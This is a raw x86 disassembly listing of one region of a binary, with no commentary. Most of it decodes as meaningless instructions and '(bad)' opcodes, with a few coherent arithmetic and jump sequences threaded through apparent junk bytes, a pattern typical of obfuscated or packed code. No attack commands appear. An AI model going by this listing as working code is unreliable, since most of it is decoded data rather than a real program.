  408048:	lea    edi,[ebx+edi*4]
  40804b:	sahf   
  40804c:	adc    al,0xeb
  40804e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40804f:	add    DWORD PTR [edx-0x32],edx
  408052:	sbb    ecx,DWORD PTR [esi-0x25]
  408055:	int3   
  408056:	outs   dx,DWORD PTR ds:[esi]
  408057:	jnp    0x4080be
  408059:	jne    0x408095
  40805b:	ret    
  40805c:	push   esi
  40805d:	inc    esp
  40805e:	inc    ebp
  40805f:	or     eax,DWORD PTR [edx]
  408061:	push   cs
  408062:	cwde   
  408063:	stos   BYTE PTR es:[edi],al
  408064:	aad    0x0
  408066:	adc    ah,bh
  408068:	or     BYTE PTR [edi+eax*4+0x6b7a6b68],ah
  40806f:	mov    dl,0xc1
  408071:	push   0xffffffe7
  408073:	add    dh,BYTE PTR [edi+0x4f1f6a48]
  408079:	fcmovb st,st(6)
  40807b:	outs   dx,BYTE PTR ds:[esi]
  40807c:	dec    esi
  40807d:	in     eax,0xd7
  40807f:	lock jne 0x4080d2
  408082:	ja     0x4080cb
  408084:	(bad)  
  408085:	(bad)  
  408086:	sub    bl,0xc0
  408089:	repz ss push 0x21
  40808d:	sbb    al,0xe5
  40808f:	dec    ecx
  408090:	outs   dx,BYTE PTR ds:[esi]
  408091:	cwde   
  408092:	push   ds
  408093:	inc    ebx
  408094:	push   0xc0ff2102
  408099:	lea    ebx,[esp+esi*4]
  40809c:	out    dx,eax
  40809d:	jae    0x4080ef
  40809f:	pop    ds
  4080a0:	pop    esp
  4080a1:	and    ah,ah
  4080a3:	adc    dh,BYTE PTR [ecx+0x232e8c90]
  4080a9:	hlt    
  4080aa:	xor    ecx,edx
  4080ac:	pop    ds
  4080ad:	push   edi
  4080ae:	cmc    
  4080af:	shl    DWORD PTR [edi+0x19],1
  4080b2:	sub    ah,BYTE PTR [edi+0x9]
  4080b5:	icebp  
  4080b6:	out    dx,eax
  4080b7:	jnp    0x40807a
  4080b9:	mov    esi,0x8cb4ecff
  4080be:	rcl    BYTE PTR [ebp-0x5d],0x57
  4080c2:	mov    edi,eax
  4080c4:	xor    al,0x19
  4080c6:	jp     0x408093
  4080c8:	imul   BYTE PTR [edx]
  4080ca:	jle    0x408108
  4080cc:	int    0x12
  4080ce:	push   ebp
  4080cf:	ds push cs
  4080d1:	xor    eax,ecx
  4080d3:	add    eax,esi
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x767bc48b],eax
  4080f8:	(bad)  
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408177
  408102:	inc    ecx
  408103:	fcomp  QWORD PTR [ebx+0x6c50ce7c]
  408109:	mov    ch,0x30
  40810b:	js     0x408169
  40810d:	pop    ds
  40810e:	aaa    
  40810f:	retf   
  408110:	push   es
  408111:	mov    edx,0x80aa58e2
  408116:	fistp  DWORD PTR [bp+si-0x11]
  40811a:	call   0xf3a8:0x4730ac6a
  408121:	or     eax,0xd8ad388c
  408126:	add    BYTE PTR [eax+0x5d],bh
  408129:	(bad)  
  40812a:	mov    bl,ah
  40812c:	stc    
  40812d:	lea    ebp,[ebx+eax*8]
  408130:	sbb    ch,bh
  408132:	out    dx,eax
  408133:	enter  0xa710,0xb4
  408137:	cmp    edx,ecx
  408139:	push   esi
  40813a:	dec    ebp
  40813b:	ret    0x586
  40813e:	jae    0x4081ae
  408140:	shr    DWORD PTR [edi+ebx*8-0x55d32366],1
  408147:	dec    ebp
  408148:	xor    DWORD PTR [esp+esi*1],esi
  40814b:	cmc    
  40814c:	retf   0x2e92
  40814f:	mov    ecx,0x2e330560
  408154:	pop    edx
  408155:	jmp    FWORD PTR [ecx+ebp*2-0x7b]
  408159:	in     eax,dx
  40815a:	fstp   DWORD PTR [ebx]
  40815c:	sub    ebx,DWORD PTR [esp+edx*8+0x5c]
  408160:	pop    esi
  408161:	dec    ebp
  408162:	pop    edx
  408163:	inc    eax
  408164:	mov    ch,BYTE PTR [esi]
  408166:	sar    DWORD PTR [edi],1
  408168:	dec    ebx
  408169:	sbb    ch,BYTE PTR ds:0x3f683c0
  40816f:	xor    esi,DWORD PTR [ebx-0x2]
  408172:	aad    0xad
  408174:	sbb    al,0xbf
  408176:	sar    DWORD PTR [ecx*1+0x4834a6af],0x62
  40817e:	sbb    BYTE PTR [edi-0x4c],0x74
  408182:	fild   DWORD PTR [eax+0x33]
  408185:	lods   al,BYTE PTR ds:[esi]
  408186:	mov    eax,ds:0x12885b66
  40818b:	dec    ecx
  40818c:	loopne 0x408185
  40818e:	xor    ebx,DWORD PTR ds:0x71eb
  408193:	mov    al,0xa2
  408195:	xchg   BYTE PTR [eax+0x497ecee2],al
  40819b:	loop   0x4081c5
  40819d:	(bad)  
  40819e:	and    BYTE PTR [edi-0x19],bh
  4081a1:	outs   dx,BYTE PTR ds:[esi]
  4081a2:	scas   al,BYTE PTR es:[edi]
  4081a3:	mov    BYTE PTR [edx+0x3fa5b9aa],dl
  4081a9:	loope  0x408143
  4081ab:	call   0xe169dc1d
  4081b0:	fscale 
  4081b2:	pop    eax
  4081b3:	sub    DWORD PTR [esi+eiz*4],edx
  4081b6:	mov    ebx,0xc2b783a3
  4081bb:	xor    BYTE PTR [edi+0xcf7ae2b],0x53
  4081c2:	cmc    
  4081c3:	into   
  4081c4:	jecxz  0x408213
  4081c6:	and    eax,0x11854e57
  4081cb:	test   al,0x4
  4081cd:	push   0x92832072
  4081d2:	mov    ebx,0xc05cf3a
  4081d7:	dec    edx
  4081d8:	inc    ebx
  4081d9:	fcomp  DWORD PTR [esi+0x5b]
  4081dc:	add    BYTE PTR [ecx+0xb],dl
  4081df:	icebp  
  4081e0:	and    BYTE PTR [edx],bh
  4081e2:	dec    edi
  4081e3:	mov    cl,0x50
  4081e5:	dec    edi
  4081e6:	xsetbv 
  4081e9:	or     cl,BYTE PTR [edx-0x5d]
  4081ec:	and    edi,DWORD PTR [ebx-0x52]
  4081ef:	std    
  4081f0:	fisub  DWORD PTR [ebx-0x52263ef0]
  4081f6:	jb     0x408240
  4081f8:	ins    BYTE PTR es:[edi],dx
  4081f9:	mov    ch,0x48
  4081fb:	ins    DWORD PTR es:[edi],dx
  4081fc:	mov    dh,0xc8
  4081fe:	jmp    0xfa4b:0xfd8acd95
  408205:	(bad)  
  408206:	stos   DWORD PTR es:[edi],eax
  408207:	jmp    0x858:0x29253e79
  40820e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40820f:	(bad)  
  408210:	or     edi,DWORD PTR [ecx+eax*1-0xa]
  408214:	(bad)  
  408216:	xchg   ebx,eax
  408217:	(bad)  
  408218:	xor    al,0xe8
  40821a:	push   ds
  40821b:	mov    BYTE PTR [ebx+0x74c0ec32],cl
  408221:	nop
  408222:	outs   dx,BYTE PTR ds:[esi]
  408223:	jbe    0x4081fd
  408225:	mov    esp,0xfa1fd04a
  40822a:	dec    eax
  40822b:	and    al,0xed
  40822d:	sbb    ch,BYTE PTR [ebp+0x68]
  408230:	pop    es
  408231:	retf   0xb645
  408234:	push   esp
  408235:	jle    0x4082b0
  408237:	push   es
  408238:	xlat   BYTE PTR ds:[ebx]
  408239:	dec    ecx
  40823a:	mov    eax,0x3d04e9c7
  40823f:	daa    
  408240:	adc    al,0xa9
  408242:	mov    esp,0x8120bc3d
  408247:	cmp    BYTE PTR [esi+0x9],ch
  40824a:	and    ch,BYTE PTR [eax+0x6b]
  40824d:	jl     0x4081f8
  40824f:	xchg   BYTE PTR [esi+0x37],al
  408252:	into   
  408253:	and    DWORD PTR [ebp-0x73bf233b],ebx
  408259:	xor    DWORD PTR [ebx+edi*1],ebp
  40825c:	shl    BYTE PTR [ebx+ebx*2-0x118f9be0],cl
  408263:	mov    al,ds:0x3dc22121
  408268:	sub    dh,BYTE PTR [ebx-0x51]
  40826b:	jno    0x4082ac
  40826d:	imul   esp,DWORD PTR [eax+0x74],0xcaa1c4d1
  408274:	push   edi
  408275:	add    ax,0x75da
  408279:	loopne 0x408266
  40827b:	dec    esp
  40827c:	mov    eax,0xf9fe6a6b
  408281:	xchg   esi,eax
  408282:	ret    0xc9f8
  408285:	dec    eax
  408286:	leave  
  408287:	mov    BYTE PTR [edi+0x7c],ch
  40828a:	cmp    ch,BYTE PTR [ecx-0x11]
  40828d:	cmp    dl,bl
  40828f:	sub    BYTE PTR [ebp+esi*1-0x6f],ch
  408293:	outs   dx,DWORD PTR ds:[esi]
  408294:	pushf  
  408295:	jl     0x408218
  408297:	mov    esp,0xb2396b8a
  40829c:	or     cl,BYTE PTR [eax+0x63]
  40829f:	jl     0x4082dd
  4082a1:	cmp    ebx,DWORD PTR [eax]
  4082a3:	dec    eax
  4082a4:	lock fdivr st,st(7)
  4082a7:	stos   DWORD PTR es:[edi],eax
  4082a8:	leave  
  4082a9:	xchg   edx,eax
  4082aa:	push   es
  4082ab:	sub    eax,DWORD PTR [ecx]
  4082ad:	push   ecx
  4082ae:	add    edi,DWORD PTR [edi+0x2477eb37]
  4082b4:	push   esp
  4082b5:	fcmovnbe st,st(1)
  4082b7:	jg     0x408306
  4082b9:	scas   eax,DWORD PTR es:[edi]
  4082ba:	in     eax,0xd1
  4082bc:	xchg   ecx,eax
  4082bd:	addr16 jmp 0x408309
  4082c0:	inc    ebx
  4082c1:	adc    ecx,DWORD PTR [esi+0x592c1408]
  4082c7:	push   ds
  4082c8:	adc    ebp,DWORD PTR [bp+0x23]
  4082cc:	aas    
  4082cd:	test   BYTE PTR [eax+0x68],0xa7
  4082d1:	jmp    0x62bc:0x4d8e6f07
  4082d8:	sub    eax,0x4b5069fc
  4082dd:	test   DWORD PTR [ecx],ecx
  4082df:	(bad)  
  4082e0:	(bad)  [ebp+0x6ae71757]
  4082e6:	dec    ecx
  4082e7:	inc    edi
  4082e8:	dec    edi
  4082e9:	fdiv   DWORD PTR [ebp+0x52070027]
  4082ef:	rcr    ebp,0x7
  4082f2:	add    eax,esi
  4082f4:	xchg   edi,eax
  4082f5:	lock xor BYTE PTR [ebx+0x8],al
  4082f9:	sub    BYTE PTR [ebx],0x83
  4082fc:	out    dx,eax
  4082fd:	cmp    dh,BYTE PTR [esi]
  4082ff:	pop    es
  408300:	sub    BYTE PTR [eax+0x65],bl
  408303:	loop   0x408336
  408305:	ror    BYTE PTR ds:0xbb11,cl
  40830a:	sbb    esi,ebx
  40830c:	js     0x408310
  40830e:	popa   
  40830f:	mov    esp,0x2dbe3bba
  408314:	jno    0x408325
  408316:	xor    al,0x69
  408318:	push   esi
  408319:	daa    
  40831a:	fisubr DWORD PTR [edi]
  40831c:	inc    edi
  40831d:	out    0xfa,al
  40831f:	mov    cl,BYTE PTR [edx+0x16]
  408322:	mov    DWORD PTR [edx-0xfcbecc9],ebx
  408328:	leave  
  408329:	cwde   
  40832a:	int3   
  40832b:	ror    DWORD PTR [ebx+0x1],0x19
  40832f:	xor    ah,dl
  408331:	pop    ebx
  408332:	push   edi
  408333:	adc    eax,0x69855ad2
  408338:	mov    bl,ch
  40833a:	mov    ds:0xee97eda7,al
  40833f:	mov    ds:0x92d9b482,al
  408344:	dec    ebp
  408345:	adc    DWORD PTR [edi],ebx
  408347:	cmp    BYTE PTR [edi],ch
  408349:	xor    DWORD PTR [ebx+0x53cbdd3c],ebx
  40834f:	jl     0x40839c
  408351:	mov    DWORD PTR [ebx+0xc0d4778],edx
  408357:	adc    BYTE PTR [ebx+eax*8],dl
  40835a:	iret   
  40835b:	loope  0x408361
  40835d:	cmp    DWORD PTR [ebx+0x151b6201],0xffffffc7
  408364:	pop    eax
  408365:	into   
  408366:	sub    eax,0xc01a3ced
  40836b:	nop
  40836c:	fisttp QWORD PTR [ebp+0x22]
  40836f:	cld    
  408370:	mov    esp,0x1ad97a23
  408375:	scas   al,BYTE PTR es:[edi]
  408376:	dec    edx
  408377:	jmp    0x40834a
  408379:	lock sub ch,BYTE PTR [ebx-0x1]
  40837d:	pop    bx
  40837f:	fdivr  DWORD PTR [esi+0x31b50e3f]
  408385:	xlat   BYTE PTR ds:[ebx]
  408386:	ins    BYTE PTR es:[edi],dx
  408387:	xlat   BYTE PTR ds:[ebx]
  408388:	sahf   
  408389:	cli    
  40838a:	cmp    eax,0xb4bb617
  40838f:	imul   esp,DWORD PTR [edi+0x5f09c50],0x9
  408396:	mov    ds,ebp
  408398:	jne    0x40840a
  40839a:	jmp    FWORD PTR [eax+0x1ab1f597]
  4083a0:	dec    esi
  4083a1:	push   0xffffff80
  4083a3:	adc    ebp,DWORD PTR [esi-0x2bc51eb6]
  4083a9:	scas   al,BYTE PTR es:[edi]
  4083aa:	or     BYTE PTR ds:[ebx-0x11],cl
  4083ae:	push   esp
  4083af:	retf   
  4083b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b1:	test   al,0x44
  4083b3:	mov    dh,0x9a
  4083b5:	fcomp  DWORD PTR [edx]
  4083b7:	mov    bl,0x5d
  4083b9:	push   esi
  4083ba:	and    DWORD PTR [ecx],esp
  4083bc:	shl    esp,cl
  4083be:	sbb    eax,0xd9d8d582
  4083c3:	fs dec esp
  4083c5:	popf   
  4083c6:	(bad)  
  4083c7:	inc    ebx
  4083c8:	pop    edi
  4083c9:	dec    esp
  4083ca:	out    0xe,al
  4083cc:	ins    BYTE PTR es:[edi],dx
  4083cd:	pop    ds
  4083ce:	cmc    
  4083cf:	fcmovbe st,st(4)
  4083d1:	ret    0xa2a3
  4083d4:	fist   WORD PTR [ebx+0x74]
  4083d7:	push   ebx
  4083d8:	adc    edx,DWORD PTR [ecx-0x7f26ced6]
  4083de:	or     BYTE PTR [edi-0x4e],ch
  4083e1:	pop    ecx
  4083e2:	das    
  4083e3:	jo     0x4083a2
  4083e5:	jp     0x408436
  4083e7:	dec    esi
  4083e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083e9:	call   0x544:0x8af0171a
  4083f0:	test   al,0x8a
  4083f2:	push   ebp
  4083f3:	(bad)  
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x4a779f8a],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40841b
  408448:	lods   al,BYTE PTR ds:[esi]
  408449:	fiadd  DWORD PTR [edx]
  40844b:	loop   0x408470
  40844d:	sub    BYTE PTR [esi],cl
  40844f:	jne    0x4083fa
  408451:	adc    al,0x14
  408453:	and    al,0xe9
  408456:	sahf   
  408457:	enter  0xed1e,0x14
  40845b:	pop    es
  40845c:	iret   
  40845d:	scas   eax,DWORD PTR es:[edi]
  40845e:	adc    eax,0x8e77abdb
  408463:	lea    eax,fs:[edx+eax*2]
  408467:	stos   DWORD PTR es:[edi],eax
  408468:	cmp    al,0xe
  40846a:	lods   al,BYTE PTR ds:[esi]
  40846b:	dec    ebx
  40846c:	or     edi,0xde20159d
  408472:	cmp    BYTE PTR [eax+0x3e],dl
  408475:	sbb    bx,sp
  408478:	loope  0x408416
  40847a:	dec    eax
  40847b:	shl    DWORD PTR [ebp+0x2e],cl
  40847e:	rol    DWORD PTR [edx],0x2d
  408481:	(bad)  
  408482:	xlat   BYTE PTR ds:[ebx]
  408483:	pop    ebp
  408484:	jmp    0x31d088d2
  408489:	mov    edi,ss
  40848b:	sub    ebx,edx
  40848d:	rol    BYTE PTR [ecx-0x71afd949],1
  408493:	cmp    ah,BYTE PTR [esp+esi*2]
  408496:	ss jl  0x408512
  408499:	or     eax,0xdea7eb3c
  40849e:	mov    ecx,0x6186c698
  4084a3:	data16 mov dh,0xee
  4084a6:	cmp    DWORD PTR [ebp+0x1a9b529c],esi
  4084ac:	mov    bh,0x45
  4084ae:	in     eax,0x9d
  4084b0:	push   0xffffff8d
  4084b2:	popf   
  4084b3:	mov    bh,0x87
  4084b5:	(bad)  
  4084b6:	fsubr  DWORD PTR [ebx]
  4084b8:	and    eax,0x50640a9e
  4084bd:	adc    eax,0x899a9768
  4084c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084c3:	and    DWORD PTR [ecx],edx
  4084c5:	mov    al,ds:0xa1dde24c
  4084ca:	and    DWORD PTR [edi],edi
  4084cc:	mov    dh,0x52
  4084ce:	leave  
  4084cf:	scas   eax,DWORD PTR es:[edi]
  4084d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084d1:	pop    esi
  4084d2:	pop    es
  4084d3:	or     eax,0x9ecc91c5
  4084d8:	xchg   ebx,eax
  4084d9:	test   WORD PTR [edx],0xb98e
  4084de:	scas   eax,DWORD PTR es:[edi]
  4084df:	lea    edx,[ecx]
  4084e1:	hlt    
  4084e2:	ins    DWORD PTR es:[edi],dx
  4084e3:	mov    al,ds:0x694c9cfd
  4084e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084e9:	loop   0x408507
  4084eb:	xor    ch,BYTE PTR [ebp+ecx*2-0x35]
  4084ef:	mov    al,0x2b
  4084f1:	xchg   BYTE PTR [edx+0x4998444a],ch
  4084f7:	(bad)  
  4084f8:	mov    edx,0xf4c3721e
  4084fd:	and    eax,0xe47cf1e0
  408502:	pop    esp
  408503:	push   esp
  408504:	imul   edi,DWORD PTR [eax+edx*8+0x78786b62],0x6fd94cb6
  40850f:	xor    eax,0xf20f2382
  408514:	add    BYTE PTR [edx+0x72856a2c],bh
  40851a:	jmp    0x4084ad
  40851c:	push   esi
  40851d:	out    0x7f,al
  40851f:	iret   
  408520:	add    DWORD PTR [ebp-0x53cddd4],0xd53c8c87
  40852a:	in     eax,dx
  40852b:	xchg   edi,eax
  40852c:	mov    bl,0xc8
  40852e:	stos   DWORD PTR es:[edi],eax
  40852f:	imul   esi,DWORD PTR [eax-0x54],0x4e
  408533:	cli    
  408534:	mov    ah,0x1a
  408536:	mov    esi,?
  408538:	int    0xa4
  40853a:	xor    eax,0xf3ffcb89
  40853f:	mov    DWORD PTR [esp+eax*1-0x5d],eax
  408543:	mov    dl,0x3d
  408545:	int3   
  408546:	bound  esi,QWORD PTR [eax+0x7f]
  408549:	pop    ds
  40854a:	add    dh,BYTE PTR [edi+0x3a]
  40854d:	fidivr DWORD PTR [eax]
  40854f:	pop    eax
  408550:	sub    eax,0x556f7aab
  408555:	test   eax,0x24756e2b
  40855a:	mov    ebx,0x2ea0ec8e
  40855f:	lea    edi,[ebx-0x6b1a9c95]
  408565:	dec    ebx
  408566:	jo     0x408525
  408568:	sbb    eax,0x3234794f
  40856d:	ret    
  40856e:	cmp    al,0xb1
  408570:	mov    dh,0x97
  408572:	icebp  
  408573:	pushf  
  408574:	mov    ds:0x2a3245f6,eax
  408579:	(bad)  
  40857b:	and    BYTE PTR [ebp-0x7e5e1337],bh
  408581:	pop    ebx
  408582:	pop    edx
  408583:	loop   0x4085b0
  408585:	(bad)  
  408587:	or     al,0xab
  408589:	shl    dl,cl
  40858b:	arpl   WORD PTR [ebx+0x7c765068],di
  408591:	enter  0x1096,0x46
  408595:	mov    cl,0x49
  408597:	adc    ah,BYTE PTR [esi+eax*2-0x63]
  40859b:	imul   esi,DWORD PTR [ecx+ecx*2-0x63],0x5e033493
  4085a3:	cmp    eax,0x7506defb
  4085a8:	imul   BYTE PTR [ecx-0x4]
  4085ab:	mov    ds:0xbdeb7327,eax
  4085b0:	xor    al,0xb
  4085b2:	xor    eax,0x308a2bff
  4085b7:	jne    0x4085a1
  4085b9:	sbb    cl,BYTE PTR ds:0xa8bab316
  4085bf:	push   esp
  4085c0:	call   0x4320:0x390d32bd
  4085c7:	pop    eax
  4085c8:	push   esp
  4085c9:	dec    ecx
  4085ca:	jg     0x4085f4
  4085cc:	push   ebp
  4085cd:	stos   BYTE PTR es:[edi],al
  4085ce:	std    
  4085cf:	push   esi
  4085d0:	enter  0xac70,0x6
  4085d4:	jnp    0x40862d
  4085d6:	lods   eax,DWORD PTR ds:[esi]
  4085d7:	fcmove st,st(4)
  4085d9:	je     0x4085a9
  4085db:	sub    al,0xae
  4085dd:	shr    esi,1
  4085df:	hlt    
  4085e0:	out    dx,al
  4085e1:	sbb    BYTE PTR [edx+ebp*1-0x3bd5d012],ch
  4085e8:	mov    eax,fs
  4085ea:	xor    DWORD PTR [eax],edx
  4085ec:	test   al,0xdd
  4085ee:	ja     0x408656
  4085f0:	fist   WORD PTR [ebp+ebp*2+0x70f8fa83]
  4085f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f8:	push   ecx
  4085f9:	dec    ebx
  4085fa:	pushf  
  4085fb:	cmc    
  4085fc:	jge    0x408601
  4085fe:	or     BYTE PTR [edx-0x72],bl
  408601:	clc    
  408602:	out    dx,al
  408603:	shl    ecx,1
  408605:	ins    BYTE PTR es:[edi],dx
  408606:	jle    0x4085dc
  408608:	(bad)  
  408609:	push   0x5d
  40860b:	sub    esp,DWORD PTR [esi-0x49]
  40860e:	jae    0x40859b
  408610:	loope  0x4085e3
  408612:	pop    esp
  408613:	xchg   ebp,eax
  408614:	push   ss
  408615:	sbb    ch,BYTE PTR [edx]
  408617:	mov    gs,ebp
  408619:	icebp  
  40861a:	ins    BYTE PTR es:[edi],dx
  40861b:	popf   
  40861c:	mov    al,0x94
  40861e:	jmp    0x4085a3
  408620:	outs   dx,BYTE PTR ds:[esi]
  408621:	mov    dl,0x4e
  408623:	mov    bh,0xfc
  408625:	je     0x40864f
  408627:	pushf  
  408628:	mov    ds:0xf09be21c,al
  40862d:	xor    bh,cl
  40862f:	and    ecx,DWORD PTR [ecx-0x1d17036b]
  408635:	mov    edi,DWORD PTR [esi-0x71]
  408638:	push   ds
  408639:	xor    al,0xd9
  40863b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40863c:	xchg   esp,eax
  40863d:	rcr    ch,cl
  40863f:	shl    DWORD PTR [edx+eiz*2-0x38],1
  408643:	xchg   ebx,esp
  408645:	in     al,0x9
  408647:	out    0x66,eax
  408649:	hlt    
  40864a:	xchg   ecx,eax
  40864b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40864c:	aam    0xf1
  40864e:	sbb    BYTE PTR [ecx+0x113ce92b],0xf1
  408655:	int    0xb1
  408657:	sbb    BYTE PTR [edx],dl
  408659:	cli    
  40865a:	pop    ss
  40865b:	(bad)  
  40865c:	loopne 0x4086da
  40865e:	xor    ebp,DWORD PTR [edx-0x3cd1b1d8]
  408664:	adc    BYTE PTR [edx],bh
  408666:	xchg   esi,eax
  408668:	push   0xfffffffd
  40866a:	(bad)  
  40866b:	(bad)  
  40866c:	sub    eax,0x54c016ed
  408671:	adc    edi,DWORD PTR [ebx]
  408673:	pop    eax
  408674:	xchg   DWORD PTR [edi-0x30],esp
  408677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408679:	out    0x95,eax
  40867b:	jne    0x408676
  40867d:	icebp  
  40867e:	cdq    
  40867f:	xchg   esp,eax
  408680:	push   ecx
  408681:	pop    ds
  408682:	jns    0x4086fe
  408684:	repz ficom WORD PTR [esi+edi*1]
  408688:	mov    al,0x98
  40868a:	in     al,dx
  40868b:	sub    DWORD PTR ds:0xaca9713b,0x8240fc8d
  408695:	sbb    al,0x15
  408697:	fs clc 
  408699:	dec    esp
  40869a:	pop    edx
  40869b:	dec    eax
  40869c:	adc    bh,0x3e
  40869f:	mov    eax,ds:0xa61d147f
  4086a4:	ficom  DWORD PTR [ebp+0x653cf4a8]
  4086aa:	in     eax,dx
  4086ab:	dec    esi
  4086ac:	and    eax,0x2b6091dd
  4086b1:	bound  esi,QWORD PTR [esi]
  4086b3:	out    0xe0,al
  4086b5:	mov    ebp,0xf54176b1
  4086ba:	jmp    esi
  4086bc:	aam    0x45
  4086be:	mov    ch,0x48
  4086c0:	imul   ebp,DWORD PTR [edi+0x7c],0x9406863e
  4086c7:	test   DWORD PTR [ecx+0x50],eax
  4086ca:	aas    
  4086cb:	int    0xf
  4086cd:	pop    edi
  4086ce:	pop    ecx
  4086cf:	gs loope 0x4086a8
  4086d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d3:	stc    
  4086d4:	and    al,0xd1
  4086d6:	inc    esi
  4086d7:	pop    ss
  4086d8:	repnz lds esp,FWORD PTR [ecx]
  4086db:	hlt    
  4086dc:	add    DWORD PTR [eax],esp
  4086de:	push   ecx
  4086df:	cdq    
  4086e0:	add    eax,0x33addc75
  4086e5:	leave  
  4086e6:	mov    ds:0x24111973,al
  4086eb:	lods   eax,DWORD PTR ds:[esi]
  4086ec:	ret    0xab7a
  4086ef:	push   ebp
  4086f0:	addr16 popf 
  4086f2:	sbb    edi,ebx
  4086f4:	push   ecx
  4086f5:	aam    0x97
  4086f7:	cli    
  4086f8:	outs   dx,DWORD PTR ds:[esi]
  4086f9:	adc    DWORD PTR [ebx],0x8bfe654a
  4086ff:	and    BYTE PTR [edi],bh
  408701:	inc    ebp
  408702:	scas   eax,DWORD PTR es:[edi]
  408703:	repz push es
  408705:	stos   BYTE PTR es:[edi],al
  408706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408707:	jl     0x4086c6
  408709:	xor    eax,0xbad9ddc0
  40870e:	enter  0x7d68,0x14
  408712:	ins    BYTE PTR es:[edi],dx
  408713:	sub    dh,BYTE PTR [esi]
  408715:	sar    edi,1
  408717:	sbb    DWORD PTR [eax-0x5b],edx
  40871a:	dec    ecx
  40871b:	in     eax,dx
  40871c:	sub    ecx,eax
  40871e:	inc    ebx
  40871f:	xor    al,0xed
  408721:	ror    BYTE PTR [edi],cl
  408723:	xchg   esp,eax
  408724:	dec    ebp
  408725:	jg     0x4086cb
  408727:	aam    0xff
  408729:	cmc    
  40872a:	pop    ebp
  40872b:	inc    ecx
  40872c:	xchg   ecx,eax
  40872d:	repz out 0x95,al
  408730:	(bad)  
  408731:	cmp    ch,BYTE PTR [ebx]
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	lahf   
  408778:	btc    DWORD PTR [esi+0x7878e7cc],esi
  40877f:	fs jle 0x4087fa
  408782:	js     0x40876b
  408784:	add    ch,bl
  408786:	dec    edi
  408787:	or     ah,BYTE PTR fs:[esi+ebp*8-0x3cab6f22]
  40878f:	popf   
  408790:	ret    
  408791:	dec    ebx
  408792:	push   0x1f
  408794:	add    DWORD PTR [esi+0x59],ebp
  408797:	mov    ebp,0x2b6f6812
  40879c:	jl     0x4087bd
  40879e:	pop    esp
  40879f:	sahf   
  4087a0:	in     al,0x9b
  4087a2:	mov    edi,0x1fd91bea
  4087a7:	popf   
  4087a8:	jb     0x4087ff
  4087aa:	int    0x37
  4087ac:	dec    esp
  4087ad:	stc    
  4087ae:	in     al,dx
  4087af:	mov    esp,DWORD PTR [edx]
  4087b1:	push   edi
  4087b2:	mov    ds:0x3b1192e,eax
  4087b7:	inc    DWORD PTR [edx]
  4087b9:	mov    WORD PTR [edi+ebp*1+0x16],gs
  4087bd:	cmp    BYTE PTR [edi-0x1a],0x45
  4087c1:	out    dx,al
  4087c2:	(bad)  
  4087c3:	pop    ecx
  4087c4:	fcomp  DWORD PTR ds:0xddae46e3
  4087ca:	jecxz  0x408770
  4087cc:	cdq    
  4087cd:	ret    
  4087ce:	sub    BYTE PTR [ebp-0x337a8f9a],dh
  4087d4:	jnp    0x4087e3
  4087d6:	retf   
  4087d7:	out    0x6d,al
  4087d9:	inc    edi
  4087da:	pop    edi
  4087db:	mov    al,BYTE PTR [esi+0x62]
  4087de:	mul    DWORD PTR [edi-0x10]
  4087e1:	push   0xd0891630
  4087e6:	inc    edi
